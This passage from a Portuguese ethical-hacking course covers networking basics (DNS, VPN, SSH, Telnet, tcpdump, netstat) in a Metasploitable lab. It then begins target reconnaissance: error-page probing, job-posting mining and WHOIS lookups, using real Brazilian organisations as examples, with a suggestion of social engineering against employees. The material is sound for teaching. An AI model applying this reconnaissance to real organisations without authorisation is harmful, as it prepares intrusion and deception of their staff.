/> <br /> O Domain Name System (DNS) é um sistema hierárquico descentralizado de nomes para computadores, serviços ou outros recursos conectados à Internet ou a uma rede privada. Associa várias informações com nomes de domínio atribuídos a cada uma das entidades participantes. Mais proeminente, ele traduz nomes de domínio mais prontamente memorizado para os endereços IP numéricos necessários para localizar e identificar serviços de computador e dispositivos com os protocolos de rede subjacentes. Ao fornecer um serviço de diretório distribuído em todo o mundo, o Domain Name System é um componente essencial da funcionalidade da Internet, que está em uso desde 1985. Fonte: https://pt.wikipedia.org/wiki/Domain_Name_System<br /> <br /> A consulta DNS Quando um usuário realiza uma consulta no navegador por alguma página na internet através do nome, por exemplo guardweb.com.br, ele envia uma consulta pela internet para encontrar o website solicitado. Uma consulta é uma pergunta em busca do nome de domínio correspondente ao IP. Vamos verificar como essas requisições funcionam: O primeiro servidor a ser consultado interage com o seu solucionador recursivo, que normalmente é operado por um provedor de serviços de internet (ISP). O solucionador recursivo sabe qual o outro servidor de DNS deve consultar para responder à sua pergunta original: “Qual é o endereço IP do website guardweb.com.br?”. 60<br /> <br /> Os servidores Root O primeiro tipo de servidor DNS com o qual o solucionador recursivo se comunica é um servidor root. Os servidores root estão em todo o globo e cada um deles possui informações do DNS sobre domínios de primeiro nível como o .br. Para começar a responder à consulta realizada, o solucionador recursivo pede a um root server informações de DNS sobre o .br. Servidor de nomes TLD Cada servidor de nomes DNS de domínio de primeiro nível (TLD) armazena informação de endereço para domínios de segundo nível (guardweb.com) dentro do domínio de primeiro nível (.br). Quando sua consulta chega ao servidor TLD, ele responde com o endereço IP do servidor de nomes de domínio, que proporcionará a próxima parte do domínio. Servidor de Nomes de Domínio Em seguida, o solucionador recursivo envia a consulta ao servidor nome de domínio. O servidor de DNS conhece o endereço IP do domínio completo, o guardweb.com.br e essa resposta é enviada ao solucionador recursivo. NOME DE DOMINIO | IPv4 guardweb.com.br 104.31.87.52 2400:cb00:2048:1::681f:5734<br /> <br /> |<br /> <br /> IPv6<br /> <br /> À medida que a Internet suporta cada vez mais usuários, conteúdos e aplicativos, o padrão original de IP, IPv4, que permite até 4.3 bilhões de endereços 61<br /> <br /> IP exclusivos, será substituído pelo Ipv6, que suportará 340 undecilhões de endereços IP exclusivos. Fonte: https://www.verisign.com/pt_BR/website-presence/online/how-dns-works/ index.xhtml<br /> <br /> 18.<br /> <br /> VPN - Virtual private network<br /> <br /> Uma VPN, Virtual private network, é uma conexão estabelecida sobre uma infraestrutura pública ou compartilhada, usando tecnologias de tunelamento e criptografia para manter seguros os dados trafegados. VPNs seguras usam protocolos de criptografia por tunelamento que fornecem a confidencialidade, autenticação e integridade necessárias para garantir a privacidade das comunicações requeridas. Alguns desses protocolos que são normalmente aplicados em uma VPN são: L2TP, L2F, PPTP e o IPSec. Quando adequadamente implementados, estes protocolos podem assegurar comunicações seguras através de redes inseguras. Deve ser notado que a escolha, implementação e uso desses protocolos não é algo trivial, e várias soluções de VPN inseguras são distribuídas no mercado. Adverte-se aos usuários para que investiguem com cuidado os produtos que fornecem VPNs. Para se configurar uma VPN, é preciso fazer através de serviços de acesso remoto, tal como o RAS, encontrado no Windows 2000 e em versões posteriores, ou o SSH, encontrado nos sistemas GNU/ Linux e outras variantes do Unix. Funcionamento da VPN<br /> <br /> 62<br /> <br /> Quando uma rede quer enviar dados para a outra rede através da VPN, um protocolo, exemplo IPSec, faz o encapsulamento do quadro normal com o cabeçalho IP da rede local e adiciona o cabeçalho IP da Internet atribuída ao Roteador, um cabeçalho AH, que é o cabeçalho de autenticação e o cabeçalho ESP, que é o cabeçalho que provê integridade, autenticidade e criptografia à área de dados do pacote. Quando esses dados encapsulados chegarem à outra extremidade, é feito o desencapsulamento do IPSec e os dados são encaminhados ao referido destino da rede local. Fonte: https://pt.wikipedia.org/wiki/Virtual_private_network<br /> <br /> 19.<br /> <br /> PROXY<br /> <br /> O proxy é um servidor que age como um intermediário para requisições de clientes solicitando recursos de outros servidores. Um cliente conecta-se ao servidor proxy, solicitando algum serviço, como um arquivo, conexão, página web ou outros recursos disponíveis de um servidor diferente, e o proxy avalia a solicitação como um meio de simplificar e controlar sua complexidade. Os proxies foram inventados para adicionar estrutura e encapsulamento a sistemas distribuídos. Atualmente, a maioria dos proxies é proxy web, facilitando o acesso ao conteúdo na World Wide Web e fornecendo anonimato. Um servidor proxy pode, opcionalmente, alterar a requisição do cliente ou a resposta do servidor e, algumas vezes, pode disponibilizar este recurso mesmo sem se conectar ao servidor especificado. Pode também atuar como um servidor que armazena dados em forma de cache em redes de computadores. São instalados em máquinas com ligações tipicamente 63<br /> <br /> superiores às dos clientes e com poder de armazenamento elevado. Esses servidores têm uma série de usos, como filtrar conteúdo, providenciar anonimato, entre outros. Fonte: https://pt.wikipedia.org/wiki/Proxy<br /> <br /> 20.<br /> <br /> DMZ - Demilitarized Zone<br /> <br /> Uma DMZ, Demilitarized zone, também conhecida como rede de perímetro, é uma sub-rede física ou lógica que contém e expõe serviços de fronteira externa de uma organização a uma rede maior e não confiável, normalmente a Internet. Quaisquer dispositivos situados nesta área, isto é, entre a rede confiável, geralmente a rede privada local, e a rede não confiável, geralmente a Internet, está na zona desmilitarizada. A função de uma DMZ é manter todos os serviços que possuem acesso externo, tais como servidores HTTP, FTP, de correio eletrônico etc., juntos em uma rede local, limitando, assim, o potencial dano em caso de comprometimento de algum desses serviços por um invasor. Para atingir esse objetivo os computadores presentes em uma DMZ não devem conter nenhuma forma de acesso à rede local.<br /> <br /> 64<br /> <br /> A configuração é realizada através do uso de equipamentos de firewall, que vão realizar o controle de acesso entre a rede local, a internet e a DMZ. Fonte: https://pt.wikipedia.org/wiki/DMZ_(computação)<br /> <br /> 21.<br /> <br /> DynDNS<br /> <br /> O Dynamic DNS, DDNS, é um método de atualizar automaticamente um servidor de nomes no Domain Name System (DNS), com a configuração de DDNS ativando seus nomes de hosts configurados, endereços ou outras informações. Ele é padronizado pelo RFC 2136. Fonte: https://pt.wikipedia.org/wiki/DNS_dinâmico<br /> <br /> 22.<br /> <br /> SSH 65<br /> <br /> O Secure Shell (SSH) é um protocolo de rede criptográfico para operação de serviços de rede de forma segura sobre uma rede insegura. A melhor aplicação de exemplo conhecida é para login remoto a sistemas de computadores pelos usuários. O SSH fornece um canal seguro sobre uma rede insegura em uma arquitetura cliente-servidor, conectando uma aplicação cliente SSH com um servidor SSH. Aplicações comuns incluem login em linha de comando remoto e execução remota de comandos, mas qualquer serviço de rede pode ser protegido com SSH. A especificação do protocolo distingue entre duas versões maiores, referidas como SSH-1 e SSH-2. A aplicação mais visível do protocolo é para acesso a contas shell em sistemas operacionais do tipo Unix, mas também se verifica algum uso limitado no Windows. O SSH foi projetado como um substituto para o Telnet e para protocolos de shell remotos inseguros como os protocolos Berkeley rlogin, rsh e rexec. Esses protocolos enviam informações, notavelmente senhas, em texto puro, tornando-os suscetíveis à interceptação e divulgação, usando análise de pacotes. A criptografia usada pelo SSH objetiva fornecer confidencialidade e integridade de dados sobre uma rede insegura, como a Internet. Por padrão esse protocolo é atribuído à porta 22. Fonte: https://pt.wikipedia.org/wiki/Secure_Shell<br /> <br /> Conectando a um host com o SSH - Linux 66<br /> <br /> O ssh é uma ferramenta que faz parte da suíte de programas do Kali Linux. Para utilizá-la, abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="592b36362d1932383530">[email&#160;protected]</a>:~# ssh <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="264b554047424b4f48661711140817100816081714">[email&#160;protected]</a> The authenticity of host '172.16.0.12 (172.16.0.12)' can't be established. RSA key ﬁngerprint is SHA256:BQHm5EoHX9GCiF3uVscegPXLQOsuPs+E9d/ rrJB84rk. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '172.16.0.12' (RSA) to the list of known hosts. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ef829c898e8b828681afded8ddc1ded9c1dfc1dedd">[email&#160;protected]</a>'s password: Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 … <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="305d435651545d595e705d55445143405c5f594451525c55">[email&#160;protected]</a>:~$ ssh : Executa a aplicação ssh para conectar a um host . <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="49243a2f282d24202709787e7b67787f677967787b">[email&#160;protected]</a>: msfadmin indica o usuário com credenciais na máquina com o IP 172.16.0.12 . Observe que esse comando iniciou a conexão na máquina 172.16.0.12 com o usuário msfadmin. Como é a primeira vez que esta conexão é realizada ele irá solicitar a permissão para realizar a troca de chaves de segurança. Após ser realizada a troca de chaves, entramos com a senha do usuário msfadmin e obtivemos acesso à shell deste usuário na máquina remota. Transferir arquivos com o scp - Linux 67<br /> <br /> O comando scp utiliza o protocolo SSH para enviar e receber arquivos de outras máquinas Linux. Para utilizá-lo abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ed9f828299ad868c8184">[email&#160;protected]</a>:~# scp -P 22 /root/test.txt <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="167b657077727b7f78562721243827203826382724">[email&#160;protected]</a>:/home/msfadmin <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="553826333431383c3b156462677b64637b657b6467">[email&#160;protected]</a>'s password: test.txt 100% 3675KB 30.9MB/s 00:00 scp: Executa a aplicação para transferir os arquivos scp. -P 22: Indica a porta ssh do host de destino, neste caso a porta padrão 22 . /root/test.txt: Indica o arquivo que será transferido. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="513c223730353c383f116066637f60677f617f6063">[email&#160;protected]</a>: Indica o usuário e IP do host que irá receber os arquivos. :/home/msfadmin: Indica o local onde os arquivos serão gravados no destino. Acesse a máquina de destino e verifique se o arquivo foi copiado no diretório /home/msfadmin. 23.<br /> <br /> TELNET<br /> <br /> O protocolo Telnet é um protocolo padrão da Internet que permite obter uma interface de terminais e aplicações pela Internet. Este protocolo fornece as regras básicas para ligar um cliente a um servidor. O protocolo Telnet baseia-se em uma conexão TCP para enviar dados em formato ASCII codificados em 8 bits entre os quais se intercalam sequências de controle Telnet. Ele fornece, assim, um sistema orientado para a comunicação, bidirecional (halfduplex), codificado em 8 bits, fácil de aplicar. Este é um protocolo básico, no qual outros protocolos da sequência TCP/IP (FTP, SMTP, POP3 etc.) se apoiam. As especificações do Telnet não mencionam a 68<br /> <br /> autenticação porque ele está totalmente separado dos aplicativos que o utilizam (o protocolo FTP define uma sequência de autenticação acima do Telnet). Além disso, o Telnet é um protocolo de transferência de dados sem proteção, o que quer dizer que os dados circulam abertamente na rede, ou seja, eles não são criptografados. Quando o protocolo Telnet é utilizado para ligar um hóspede distante a uma máquina que serve como servidor, por padrão esse protocolo é atribuído à porta 23. Fonte: https://pt.wikipedia.org/wiki/Telnet<br /> <br /> Utilizando o TELNET – Linux Através do telnet é possível realizar conexões em máquinas remotas e utilizá-lo para testar conexões em portas específicas. O telnet é uma ferramenta que faz parte da suíte de programas do Kali Linux. Para utilizá-lo, abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="99ebf6f6edd9f2f8f5f0">[email&#160;protected]</a>:~# telnet 172.16.0.12 Trying 172.16.0.12... Connected to 172.16.0.12. Escape character is '^]'. … Login with msfadmin/msfadmin to get started metasploitable login: telnet: Executa a aplicação telnet para iniciar uma conexão em um host. 69<br /> <br /> 172.16.0.12: Indica o IP do host de destino. Este comando irá iniciar uma conexão remota no host. Agora vamos utilizar o telnet para testar conexões em portas específicas; abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7c0e1313083c171d1015">[email&#160;protected]</a>:~# telnet 172.16.0.12 22 Trying 172.16.0.12... Connected to 172.16.0.12. Escape character is '^]'. SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 172.16.0.12: Indica o IP do host de destino. 22: Indica a porta a ser testada, neste caso a porta do ssh. Observe que ele conecta nessa porta, isso significa que ela está aberta, porém não é possível obter uma shell. Nesse caso, foi apresentado um banner do serviço SSH. Algumas máquinas podem não estar configuradas para apresentar banner do serviço. Fonte: Videoaula TDI – Conceitos Básicos de Rede – Telnet<br /> <br /> 24.<br /> <br /> TCPDump<br /> <br /> O TCPdump é uma ferramenta utilizada para monitorar os pacotes trafegados em uma rede. Ela mostra os cabeçalhos dos pacotes que passam pela interface de rede. Vamos realizar alguns testes para entender o seu funcionamento. O TCPdump é uma ferramenta que faz parte da suíte de programas do Kali Linux. Para verificar o tráfego que está ocorrendo na máquina podemos utilizar o comando: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5f2d30302b1f343e3336">[email&#160;protected]</a>:~# tcpdump -i eth0<br /> <br /> tcpdump: verbose output suppressed, use -v or -vv for full protocol decode<br /> <br /> 70<br /> <br /> listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 14:55:08.376379 IP kali.ssh > 172.16.0.10.35760: Flags [P.], seq 2116613311:2116613499, ack 1384995506, win 291, options [nop,nop,TS val 60095 ecr 6090120], length 188 14:55:08.376511 IP 172.16.0.10.35760 > kali.ssh: Flags [.], ack 188, win 1444, options [nop,nop,TS val 6090132 ecr 60095], length 0 14:55:08.401493 IP kali.45804 > gateway.domain: 38111+ PTR? 15.0.16.172.in-addr.arpa. (42) 14:55:08.425322 IP gateway.domain > kali.45804: 38111 NXDomain 0/0/0 (42) 14:55:08.425663 IP kali.36685 > gateway.domain: 25487+ PTR? 1.0.16.172.in-addr.arpa. (41) …<br /> <br /> ^C 1754 packets captured 1766 packets received by ﬁlter 11 packets dropped by kernel tcpdump: Executa a aplicação utilitário de rede tcpdump. -i eth0: Indica a interface a ser monitorada, neste caso a eth0. Para o processo, pressione Ctrl+C. Observe que esse comando mostra em tela todo o tráfego de pacotes da rede, desta forma é muito difícil de analisar todos esses pacotes. Vamos passar algumas opções do TCPdump para obter resultados mais específicos, como, por exemplo, capturar o tráfego de protocolos icmp: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="cebca1a1ba8ea5afa2a7">[email&#160;protected]</a>:~# tcpdump -n -i eth0 icmp tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 71<br /> <br /> 16:13:28.555029 IP 172.16.0.10 > 172.16.0.15: ICMP echo request, id 20129, seq 18, length 64 16:13:28.555056 IP 172.16.0.15 > 172.16.0.10: ICMP echo reply, id 20129, seq 18, length 64 16:13:28.576266 IP 172.16.0.12 > 172.16.0.15: ICMP echo request, id 9746, seq 36, length 64 16:13:28.576311 IP 172.16.0.15 > 172.16.0.12: ICMP echo reply, id 9746, seq 36, length 64 16:13:29.576604 IP 172.16.0.12 > 172.16.0.15: ICMP echo request, id 9746, seq 37, length 64 -n: Indica para o TCPdump para não resolver nomes, apresentando somente o endereço IP. icmp: Indica a o protocolo a ser apresentado na saída do comando, neste caso o protocolo icmp. Observe que foi apresentado em tela somente os pacotes sem a resolução de nomes na interface eth0 com protocolo icmp. Podemos utilizar esse comando para capturar vários tipos de protocolo, como tcp, ip, ip6 arp, rarp e decnet. Salvar capturas TCPdump Podemos também salvar a captura dos pacotes em um arquivo com um formato específico, para ser utilizado para leitura posterior pelo TCPdump e outras aplicações como o WireShark. Abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="8af8e5e5fecae1ebe6e3">[email&#160;protected]</a>:~# tcpdump -i eth0 -w tcpdump01.cap tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes ^C40 packets captured 43 packets received by ﬁlter 0 packets dropped by kernel 72<br /> <br /> -w tcpdump01.cap: Indica ao TCPdump para escrever os pacotes capturados em um arquivo, neste caso o arquivo tcpdump01.cap. Desta forma iremos capturar todo o tráfego até a interrupção do programa. Para interromper, pressione as teclas Ctrl+C, sendo possível realizar a leitura posteriormente. Analisar captura TCPdump Após capturar o tráfego é possível realizar a leitura deste arquivo e concatenar com outros comandos para filtrar a busca e apresentar em tela apenas as informações específicas. Veja alguns exemplos: Capturar pacotes http e https <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ec9e838398ac878d8085">[email&#160;protected]</a>:~# tcpdump -r tcpdump01.cap | grep http reading from ﬁle tcpdump01.cap, link-type EN10MB (Ethernet) 16:48:39.842206 IP kali.45934 > ec2-50-19-103-176.compute-1.amazonaws.com.http: Flags [S], seq 3703792603, win 29200, options [mss 1460,sackOK,TS val 530467 ecr 0,nop,wscale 7], length 0 16:48:40.383868 IP 151.101.61.177.https > kali.36780: Flags [.], seq 54186:55570, ack 1553, win 71, options [nop,nop,TS val 1514293303 ecr 530597], length 1384 … -r tcpdump01.cap: -r Indica ao TCPdump para ler um arquivo, neste caso o arquivo tcpdump01.cap. |: Concatena o comando anterior com o comando seguinte. grep http: Filtra o arquivo tcpdump01.cap trazendo informações que contenham a palavra http. 73<br /> <br /> Observe que foi apresentado em tela apenas o tráfego de conexões http e https realizadas. Capturar pacotes UDP <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2f5d40405b6f444e4346">[email&#160;protected]</a>:~# tcpdump -r tcpdump01.cap | grep UDP reading from ﬁle tcpdump01.cap, link-type EN10MB (Ethernet) 17:13:18.166615 IP 172.16.0.10.46899 > kali.44444: UDP, length 1472 17:13:18.202772 IP 172.16.0.10.46899 > kali.44445: UDP, length 1472 17:13:20.870064 IP 172.16.0.10.60509 > |: Concatena o comando anterior com o comando seguinte. grep UDP: Filtra o arquivo tcpdump01.cap trazendo informações que contenha a palavra UDP. Observe que foram apresentados em tela apenas os tráfegos de conexões UDP. Utilizando o grep podemos filtrar qualquer tipo de informações em um arquivo, basta passar a palavra que você necessita. Filtros avançados TCPdump Podemos utilizar o comando TCPdump para usar alguns filtros para realizar buscas específicas de pacotes. Abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="15677a7a61557e74797c">[email&#160;protected]</a>:~# tcpdump -n -c 4 -i eth0 icmp and src 172.16.0.15 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 74<br /> <br /> 22:51:33.050794 IP 172.16.0.15 > 172.16.0.10: ICMP echo reply, id 25746, seq 625, length 64 22:51:34.074810 IP 172.16.0.15 > 172.16.0.10: ICMP echo reply, id 25746, seq 626, length 64 22:51:35.098865 IP 172.16.0.15 > 172.16.0.10: ICMP echo reply, id 25746, seq 627, length 64 22:51:36.122800 IP 172.16.0.15 > 172.16.0.10: ICMP echo reply, id 25746, seq 628, length 64 4 packets captured 4 packets received by ﬁlter 0 packets dropped by kernel tcpdump: Executa a aplicação utilitário de rede tcpdump. -n: Indica para o TCPdump para não resolver nomes, apresentando somente o endereço IP. -c 4: -c indica a quantidade do pacote a ser apresentado em tela, neste caso 4 pacotes. -i eth0: Indica a interface a ser monitorada, neste caso a eth0. icmp: Indica a o protocolo a ser apresentado na saída do comando, neste caso o protocolo icmp. and: combina a busca do comando com a diretiva a seguir. src 172.16.0.15: Especifica a direção do pacote a ser tomada, neste caso de alguma origem src para o IP da máquina Kali, 172.16.0.15. Observe que esse comando apresenta em tela apenas os pacotes icmp de qualquer origem (src) para o destino da própria máquina (172.16.0.15). Esse comando pode ser utilizado para identificar ataques DoS na rede. Fonte: Videoaula TDI – Conceitos Básicos de Rede – TCPDump<br /> <br /> 25.<br /> <br /> Netstat 75<br /> <br /> O netstat, Network statistic, é uma ferramenta, comum ao Windows, Unix e Linux, utilizada para se obter informações sobre as conexões de rede, tabelas de roteamento, estatísticas de interface e conexões mascaradas. É um recurso que pode nos ajudar na análise de informações para descobrir conexões maliciosas que estão mascaradas ou estão tentando se conectar em nossa máquina. O netstat é uma ferramenta que faz parte da suíte de programas do Kali Linux. Para utilizá-la, abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="98eaf7f7ecd8f3f9f4f1">[email&#160;protected]</a>:~# netstat -n Active Internet connections (w/o servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 188 172.16.0.15:22 172.16.0.10:37930 ESTABLISHED Active UNIX domain sockets (w/o servers) Proto RefCnt Flags Type State I-Node Path unix 2 [] DGRAM 17008 /run/user/0/ systemd/notify unix 3 [] DGRAM 9367 /run/systemd/ notify unix 2 [] DGRAM 21661 /run/ user/1000/systemd/notify unix 21 [ ] DGRAM 9382 /run/systemd/ journal/dev-log unix 3 [] STREAM CONNECTED 19946 /run/ user/0/bus … netstat: Executa o utilitário de rede netstat. -n: Indica ao netstat para não resolver nomes. 76<br /> <br /> Esse comando apresenta as conexões existentes da máquina <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="94e6fbfbe0d4fff5f8fd">[email&#160;protected]</a>:~# netstat -na Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 172.16.0.15:22 172.16.0.10:37930 ESTABLISHED tcp6 0 0 :::22 :::* LISTEN udp 0 0 0.0.0.0:68 0.0.0.0:* raw6 0 0 :::58 :::* 7 Active UNIX domain sockets (servers and established) Proto RefCnt Flags Type State I-Node Path unix 2 [ ACC ] STREAM LISTENING 15452 @/ tmp/dbus-C0OLmKjL unix 2 [ ACC ] STREAM LISTENING 17611 @/ tmp/dbus-qxiCx6ag unix 2 [ ACC ] STREAM LISTENING 17831 @/ tmp/.ICE-unix/1062 unix 2 [ ACC ] STREAM LISTENING 15674 @/ tmp/.X11-unix/X0 unix 2 [ ACC ] STREAM LISTENING 17110 @/ tmp/.X11-unix/X1 … -a: exibe todas as conexões existentes no computador. -n: exibe todas as conexões existentes sem resolver nomes. Observe que desta forma o TCPdump apresenta todas as conexões existentes do computador, incluindo todos os protocolos e sockets (tcp, udp, raw).<br /> <br /> 77<br /> <br /> O uso das flags do comando netstat podem ser somadas facilmente. Veja abaixo uma lista de alguns comandos e seus significados do netstat: netstat -o<br /> <br /> Exibe o temporizador da conexão, ou seja, há quanto tempo essa conexão está estabelecida. Pode-se combinar à vontade: netstat -autno, netstat -axuo.<br /> <br /> netstat -i<br /> <br /> Exibe as informações de todas as interfaces ativas. Podemos ter estatísticas de erros de entrada/saída, assim como estatística de tráfego.<br /> <br /> netstat -c<br /> <br /> Repete o comando ao final, muito útil para verificar o momento exato que uma conexão é estabelecia ou para ter noção do aumento de tráfego nas interfaces, ex.: netstat -ic, netstat atnc.<br /> <br /> netstat -e<br /> <br /> Exibe uma lista mais completa. Deve ser combinado com as outras opções, como o netstat -atne. Com esse comando temos mais duas colunas, USER e INODE, ou seja, o usuário que subiu o processo que originou a abertura da porta e o INODE pertencente.<br /> <br /> netstat -p<br /> <br /> Exibe o daemon e o PID que estão ligados a essa porta, muito importante para detectarmos o daemon responsável.<br /> <br /> 78<br /> <br /> netstat -s<br /> <br /> Exibe as estatísticas dos protocolos, ou seja, quanto foi trafegado em cada protocolo. Podemos combinar para assim pegarmos a estatística de um determinado protocolo, ex.: netstat -st, netstat -su.<br /> <br /> Filtrando a busca – netstat Podemos filtrar a busca para encontrar apenas pacotes TCP. Digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bbc9d4d4cffbd0dad7d2">[email&#160;protected]</a>:~# netstat -ant Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 172.16.0.15:48430 23.111.11.111:443 ESTABLISHED tcp 0 0 172.16.0.15:43666 157.240.1.23:443 ESTABLISHED tcp 0 0 172.16.0.15:37096 0 0 172.16.0.15:42022 200.221.2.45:80 TIME_WAIT tcp 0 0 172.16.0.15:56990 173.194.139.252:443 ESTABLISHED tcp 0 0 172.16.0.15:58080 52.33.209.128:443 TIME_WAIT tcp 0 0 172.16.0.15:51764 … -t: Indica ao netstat para apresentar conexões TCP. Podemos verificar o estado das conexões realizadas pela máquina. Digite no terminal: 79<br /> <br /> <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="92e0fdfde6d2f9f3fefb">[email&#160;protected]</a>:~# netstat -at Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 172.16.0.15:51746 54.148.10.141:443 TIME_WAIT 0 0 172.16.0.15:35830 216.58.206.110:443 ESTABLISHED tcp6 0 0 :::22 :::* LISTEN udp 0 0 0.0.0.0:68 0.0.0.0:* Dessa forma, se existe alguém tentando realizar conexão ou já está com ela estabelecida, conseguimos identificar. Podemos filtrar a busca para descobrir todas as conexões UDP e TCP. Digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="cab8a5a5be8aa1aba6a3">[email&#160;protected]</a>:~# netstat -tupan<br /> <br /> Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1735/ sshd tcp 0 0 172.16.0.15:22 172.16.0.10:37930 ESTABLISHED 1737/sshd: madvan [ tcp 0 0 172.16.0.15:39142 216.58.206.46:443 ESTABLISHED 2752/ﬁrefox-esr tcp 0 0 172.16.0.15:60640 81.20.48.165:80 ESTABLISHED 2752/ﬁrefox-esr tcp6 0 0 :::22 :::* LISTEN 1735/ sshd udp 0 0 0.0.0.0:68 0.0.0.0:* 670/ dhclient<br /> <br /> 80<br /> <br /> Desta forma temos as informações de todas as conexões UDP e TCP, mostrando o estado da conexão e a exibição do programa que está utilizando essa conexão. Fonte: Videoaula TDI – Conceitos Básicos de Rede – Netstat<br /> <br /> 81<br /> <br /> Chapter 03<br /> <br /> 82<br /> <br /> 3. CONHECER<br /> <br /> UNIDADE 03<br /> <br /> Existem diversas maneiras de conhecer detalhes sobre um alvo. Para isso, podemos utilizar técnicas simples, tais como: 1.<br /> <br /> Navegando no site do Alvo<br /> <br /> Podemos conhecer mais sobre a infraestrutura de TI, nosso alvo, navegando no site, em busca de informações com páginas de erros. Um exemplo é inserindo alguma página que não existe na URL e verificar a apresentação do erro. Veja o exemplo abaixo:<br /> <br /> Observe que na URL foi inserida uma página com o nome errado no site e ele retornou uma mensagem de erro HTTP 404 informando que a página procurada não foi encontrada, observe também que ele informou o nome do serviço web, o Apache. Na própria URL é informado o tipo de linguagem que o site foi desenvolvido, nesse caso PHP. http://temporealcontabilidade.com.br/empresaTT.php 83<br /> <br /> O conhecimento do alvo não se limita apenas à estrutura de TI. Podemos encontrar em alguns sites de empresas informações sobre os funcionários. Veja o exemplo abaixo:<br /> <br /> É possível analisar informações sobre cada funcionários e aplicar ataques de engenharia social se necessário. Fonte: Videoaula TDI – Conhecer – Navegando no site do Alvo<br /> <br /> 2.<br /> <br /> Sites de emprego<br /> <br /> É possível obter informações sobre um alvo procurando em vagas de emprego na área de TI para verificar quais são os sistemas, aplicativos, banco de dados e programas utilizados. 84<br /> <br /> Essas informações podem ser obtidas no próprio site da empresa, na sessão, como nas sessões “Trabalhe Conosco” e sites de busca de vagas, como o LinkedIn. Alguns sites de busca de emprego podem manter a confidencialidade, ocultando o nome da empresa, mas vamos verificar alguns exemplos em que as empresas estão expostas: Exemplo 01:<br /> <br /> Observe que essa vaga nos passa muita informação sobre a estrutura de TI da empresa SESC Departamento Nacional em Jacarepaguá-RJ. É uma vaga para desenvolvedores em Lotus Notes. Como pré-requisitos, ele informa métodos de programação e nome das linguagens lá utilizadas. Exemplo 02:<br /> <br /> 85<br /> <br /> Observe que essa vaga para Analista de Redes Sênior informa os sistemas operacionais utilizados, Linux, Windows e Vmware. Os servidores web, Apache e IIS, banco de dados, MySQL, Oracle e SQL Server. 86<br /> <br /> Equipamentos de armazenamento, storage 3PAR, Hitachi. ~#Pensando_fora.da.caixa Estas informações que podem ser encontradas em vagas de empregos podem agilizar muito a busca de informações de infraestrutura de TI do alvo a ser analisado. Fonte: Videoaula TDI – Conhecer – Sites de emprego<br /> <br /> 3.<br /> <br /> Consultas WHOIS<br /> <br /> O WHOIS é um mecanismo que registra domínios, IPs e sistemas autônomos na Internet e que serve para identificar o proprietário de um site. Alimentado por companhias de hospedagem, ele reúne todas as informações pertencentes a uma página. No Brasil o WHOIS é atrelado a um CNPJ ou a um CPF. Tecnicamente falando, o WHOIS é um protocolo TCP que tem como objetivo consultar contato e DNS. Ele apresenta, geralmente, três principais linhas de contato do dono de um website - o contato administrativo, o contato técnico e o contato de cobrança. Além disso, são exibidos telefones e endereços físicos. Sabemos que o serviço DNS faz com que todos os nomes na internet sejam resolvidos para o IP. Existe uma organização que controla esses registros na Internet, o IANA (Internet Assigned Numbers Authority), a autoridade máxima que controla números para protocolos, os domínios de nível superior de código de país e mantém as alocações de endereço IP de todos os roots servers do globo. 87<br /> <br /> No site da IANA podemos encontrar uma lista de todos esses servidores no globo que fazem a administração total de DNS e IPs. Caso você queira saber mais sobre os roots servers, acesse: https://www.iana.org/domains/root/servers Utilizando o WHOIS na web Existem muitos serviços na internet que realizam consultas WHOIS, uma delas é uma página no site do IANA. https://www.iana.org/whois Vamos realizar uma consulta do site da GuardWeb. Entre com o site no campo de pesquisa:<br /> <br /> 88<br /> <br /> Observe que ele irá retornar informações do IP Público do site e informações administrativas, como dono, endereço, CNPJ, telefones e e-mails de contatos.<br /> <br /> Utilizando o WHOIS no Linux<br /> <br /> 89<br /> <br /> O WHOIS é uma ferramenta que faz parte da suíte de ferramentas do Kali Linux. Para utilizá-la abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" 